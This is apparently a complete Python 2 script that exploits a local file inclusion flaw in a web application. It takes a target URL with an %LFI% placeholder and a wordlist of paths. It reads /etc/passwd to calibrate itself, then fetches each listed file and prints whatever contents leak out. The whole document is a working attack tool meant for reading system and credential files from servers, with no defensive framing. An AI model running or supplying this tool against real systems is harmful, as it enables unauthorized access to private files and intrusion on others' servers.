#!/usr/bin/python
#Author: Claor - @Chronicoder - http://claor.com.ar

import requests, sys, re
from BeautifulSoup import BeautifulSoup
url = sys.argv[1]
file = open(sys.argv[2])
r = requests.get(url.replace('%LFI%', "ea25495a-859a-44ae-a1d5-f1d6435d4ce5"))
e = sum(1 for line in r.text.strip().split('\n'))
r = requests.get(url.replace('%LFI%', "/etc/passwd"))
r = r.text
line = -1
found = False

for l in r.split('\n'):
	line = line + 1
	if (len(l.split(":")) == 7):
		if (l.find("root") != -1):
			found = True
			posi = l.find("root")
			head = line
		else:
			foot = line

if (found == False):
	print "Invalid LFI link."
	exit()

foot = len(r.split('\n')) - 1 - foot

def print_r(r):
	r = r.split('\n')
	del r[-foot:]
	r = r[head:]
	r[0] = r[0][posi:]
	for l in r:
		print l

for l in file:
	if not l.startswith("#"):
		f = l.split(",")
		if len(f) == 1: f = [f[0].strip(),f[0]]
		try: 
			r = requests.get(url.replace('%LFI%', f[0]))
			if e != sum(1 for line in r.text.strip().split('\n')): 
				print "\n\033[1;32m[+]\033[1;m \033[1;33m"+f[1].strip()+"\033[1;m"+" - "+r.url+"\n"
				print_r(r.text)
		except:
			pass
